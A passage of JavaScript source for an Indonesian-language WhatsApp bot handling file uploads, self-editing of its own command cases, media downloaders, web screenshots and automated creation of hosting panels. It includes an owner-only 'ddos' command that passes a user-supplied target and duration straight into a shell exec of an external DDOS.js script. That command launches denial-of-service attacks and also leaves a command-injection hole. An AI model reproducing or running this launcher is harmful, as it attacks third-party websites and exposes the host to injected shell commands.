if (!files.includes(m.quoted.fileName)) return m.reply('Tidak Dapat Menemukan File') 
let media = await downloadContentFromMessage(m.quoted, "document")
let buffer = Buffer.from([])
for await(const chunk of media) 
{
buffer = Buffer.concat([buffer, chunk])
}
fs.writeFileSync(text, buffer)
m.reply(`Mengupload...`)
await sleep(2000)
m.reply(`Sukses Meng Upload ${q}`)
}
break

case 'sendfitur':{
if (!isOwner) return m.reply('Fitur Khusus Owner!')
if (!quoted) return m.reply(`Reply Orang Nya Lalu Masukan Nama Fiturnya`)
if (!text) return m.reply('Nama Fitur Nya Bang')
const getCase = (q) => {
return "case " + `'${q}'` + require('fs').readFileSync("NOLAN.js").toString().split('case \''+ q +'\'')[1].split("break")[0]+"break"
}
let teksnya = `Hai, Kamu Dapat Kiriman Fitur Nih
`+readmore+`

${getCase(q)}`
let t = q.split(',');
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
try{
nolan.sendMessage(u, {text: teksnya})
m.reply('Fitur Berhasil Terkirim')
} catch (e) {
m.reply('Fitur Tidak Dapat Dikirim')
}
}
break

case 'addcase': {
if (!isCreator) return m.reply('Fitur Khusus Owner!')
if (!text) return m.reply('Mana case nya bang?');
const fs = require('fs');
const namaFile = 'NOLAN.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi Kesalahan Saat Membaca File :', err);
return;
}
const posisiAwalGimage = data.indexOf("case 'addcase':");
if (posisiAwalGimage !== -1) {
const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
if (err) {
m.reply('Terjadi Kesalahan Saat Menulis File :', err);
} else {
m.reply('Sukses Menambahkan Case Baru');
}});
} else {
m.reply('Tidak Dapat Menemukan Case Gimage Didalam File');
}});
}
break

case 'delcase': {
if (!isOwner) return m.reply('Fitur Khusus Owner!')
if (!text) return m.reply('Nama Case Nya Bang');
dellCase('./NOLAN.js', q)
m.reply('Sukses Menghapus Case');
}
break

case 'getcase':
if (!isOwner) return m.reply('Fitur Khusus Owner!') 
if (!text) return m.reply(`Nama Case Nya Bang`)
const getCase = (cases) => {
return "case" + `'${cases}'` + fs.readFileSync("./NOLAN.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
}
m.reply(`${getCase(q)}`)
break

// ========== OTHERS AREA ========== \\

case 'prefix': {
m.reply('Prefix Saat Ini : Multi Prefix')
}
break

case 'rules': {
let wkwk = `*RULES BOT*

• No Spam
• No Culik ygy
• Jan Ditelpon
• Jan Send Virus

• Jeda Bentaran Kalo Make
• Owner Pihak 2 Dilarang Ddos`
}
break



case 'sc':
case 'script': {
nolan.sendMessage(m.chat, {text: `Script Ini Dijual Seharga 60k\nJika Minta Silahkan Chat Owner\n\nDengan Ketik ${prefix}owner`}, {quoted: floc})
}
break

case 'ssweb': {
if (!text) return m.reply('Link Web Nya Bang')
let teks = `Silahkan Pilih Tipe Nya`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${global.wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": `{"display_text":"SSWEB HP","id":"${prefix}ssweb-hp ${q}"}`
},
{
"name": "quick_reply",
"buttonParamsJson": `{"display_text":"SSWEB PC","id":"${prefix}ssweb-pc ${q}"}`
},
{
"name": "quick_reply",
"buttonParamsJson": `{"display_text":"SSWEB TAB","id":"${prefix}ssweb-tab ${q}"}`
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}
break

case 'ssweb-hp': {
let sshp = await getBuffer(`https://aemt.me/sshp?url=${q}`)
nolan.sendMessage(m.chat, {image: sshp, caption: "_Done_"}, {quoted: m})
}
break

case 'ssweb-pc': {
let sspc = await getBuffer(`https://aemt.me/sspc?url=${q}`)
nolan.sendMessage(m.chat, {image: sspc, caption: "_Done_"}, {quoted: m})
}
break

case 'ssweb-tab': {
let sstab = await getBuffer(`https://aemt.me/sstab?url=${q}`)
nolan.sendMessage(m.chat, {image: sstab, caption: "_Done_"}, {quoted: m})
}
break

// ========= FITUR SPESIAL ========== \\

case 'ddos': {
if (!isOwner) return m.reply('Fitur Khusus Owner!')
if (!q.includes(' ')) return m.reply(`*Contoh :* ${prefix+command} <target> <waktu>`)
const targetweb = q.substring(0, q.indexOf(' ') - 0)
const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
m.reply(`Sedang Dalam Proses Ddos...

Target : ${targetweb}
Time : ${timeweb}`)
exec(`node DDOS.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
if (error) {
m.reply(`Error: ${error.message}`);
return;
}
if (stderr) {
m.reply(`Error: ${stderr}`);
return;
}
m.reply(`*Sukses Ddos Target*\n\nTarget: ${targetweb},\nTime: ${timeweb}`);
});  
}
break

// ========= DOWNLOAD AREA ========= \\

case 'tt':
case 'ttdl':
case 'tiktok': {
if (!text) return m.reply(`*Contoh :* ${prefix+command} Linknya`)
let teks = `Silahkan Pilih Tipe Nya`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${global.wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": 
`{\"title\":\"KLIK DISINI\",\"sections\":[{\"title\":\"Silahkan Dipilih\",\"highlight_label\":\"\",\"rows\":[{"header":"",
"title":"TIKTOK VIDEO",
"description":"Download Video Type",
"id":"${prefix}tt-video ${q}"},
{"header":"",
"title":"TIKTOK AUDIO",
"description":"Download Audio Type",
"id":"${prefix}tt-audio ${q}"}]
}]
}`
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}
break

case 'tt-video': {
await nolan.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
if (q === `${mesej}`) {
require('./LIB/tiktok').Tiktok(q).then( data => {
nolan.sendMessage(m.chat, { caption: ``, video: { url: data.nowm }}, {quoted: m})
})
}
}
break

case 'tt-audio': {
await nolan.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
if (q === `${mesej}`) {
require('./LIB/tiktok').Tiktok(q).then( data => {
const ttmp3nya = {url:data.audio}
nolan.sendMessage(m.chat, { audio: ttmp3nya, mimetype: 'audio/mp3', ptt: true }, { quoted: m})
})
}
}
break

case 'ytdl':
case 'youtubedl': {
if (!text) return m.reply(`*Contoh :* ${prefix+command} Linknya`)
let teks = `Silahkan Pilih Tipe Nya`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${global.wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": 
`{\"title\":\"KLIK DISINI\",\"sections\":[{\"title\":\"Silahkan Dipilih\",\"highlight_label\":\"\",\"rows\":[{"header":"",
"title":"YOUTUBE VIDEO",
"description":"Download Video Type",
"id":"${prefix}yt-video ${q}"},
{"header":"",
"title":"YOUTUBE AUDIO",
"description":"Download Audio Type",
"id":"${prefix}yt-audio ${q}"}]
}]
}`
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}
break

case 'yt-video': {
nolan.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
downloadMp4(text)
}
break

case 'yt-audio': {
nolan.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
downloadMp3(text)
}
break

case 'igdl': {
if (!text) return m.reply(`*Contoh :* ${prefix+command} Linknya`)
await nolan.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}}) 
let anu = await fetchJson(`https://aemt.me/download/igdl?url=${text}`)
nolan.sendMessage(m.chat, { video: { url: anu.result[0].url }, caption: `_Done_` }, { quoted: m })
}
break

case 'fbdl': {
if (!text) return m.reply(`*Contoh :* ${prefix+command} Linknya`)
await nolan.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})   
let anu = await fetchJson(`https://aemt.me/download/fbdown?url=${text}`)
nolan.sendMessage(m.chat, { video: { url: anu.result.url.urls[0].hd }, caption: '_Done_' }, { quoted: m })
}
break

case 'twdl': {
if (!text) return m.reply(`*Contoh :* ${prefix+command} Linknya`)
nolan.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
let anu = await fetchJson(`https://worker.rmdni.id/downloader?url=${text}`)
nolan.sendMessage(m.chat, { video: { url: anu.result.downloadLink}, caption: `_Done_`}, {quoted: m})
}
break

case 'ccdl': {
if (!text) return m.reply(`*Contoh :* ${prefix+command} Linknya`)
await nolan.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}}) 
let anu = await fetchJson(`https://aemt.me/download/capcut?url=${text}`)
nolan.sendMessage(m.chat, { video: { url: anu.result.video_ori}, caption: `_Done_`}, {quoted: m})
}
break

case 'mfdl': {
if (!text) return m.reply(`*Contoh :* ${prefix+command} Linknya`)
await nolan.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})   
kotz.mediafire(text).then(async(data) => {
data = data[0]
data.nama = decodeURIComponent(data.nama)
var media = await getBuffer(data.link)
if (data.mime.includes('mp4')) {
nolan.sendMessage(m.chat, { document: media, fileName: data.nama, mimetype: 'video/mp4' }, { quoted: m })
} else if (data.mime.includes('mp3')) {
nolan.sendMessage(m.chat, { document: media, fileName: data.nama, mimetype: 'audio/mp3' }, { quoted: m })
} else {
nolan.sendMessage(m.chat, { document: media, fileName: data.nama, mimetype: 'application/'+data.mime }, { quoted: m })
}})
}
break

case 'apks': {
if (!text) return reply(`*Contoh :* ${prefix+command} WhatsApp`)
var js = await fetch(`https://dikaardnt.com/api/search/apk?q=${q}`)
var json = await js.json()
var capt = `
Hasil Pencarian Dari [ ${q} ]

Title : ${json[0].package}
Link : ${json[0].url}
Develoepr : ${json[0].developer}
Rating : ${json[0].rating}
`;
await nolan.sendMessage(m.chat, { image: { url: json[0].thumbnail }, caption: capt }, { quoted: m })
}
break

// ========= CREATE PANEL AREA ========= \\

case "1gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "1050"
let cpu = "30"
let disk = "1050"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `
*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • *RAM :* 1025 / 1 GB
│ • *DISK :* 1025 / 1 GB
│ • *CPU :* 30%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 1024 / 1 GB
│ • *DISK :* 1024 / 1 GB
│ • *CPU :* 30%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "2gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "2050"
let cpu = "60"
let disk = "2050"
let email = username + "@Rain.Hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `
*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • *RAM :* 2050 / 2 GB
│ • *DISK :* 2050 / 2 GB 
│ • *CPU :* 60%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 2050 / 2 GB 
│ • *DISK :* 2050 / 2 GB
│ • *CPU :* 60%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "3gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "3050"
let cpu = "90"
let disk = "3050"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `
*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • *RAM :* 3050 / 3 GB
│ • *DISK :* 3050 / 3 GB
│ • *CPU :* 90%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 3050 / 3 GB
│ • *DISK :* 3050 / 3 GB
│ • *CPU :* 90%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "4gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "4050"
let cpu = "120"
let disk = "4050"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 4050 / 4 GB
│ • *DISK :* 4050 / 4 GB
│ • *CPU :* 120%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
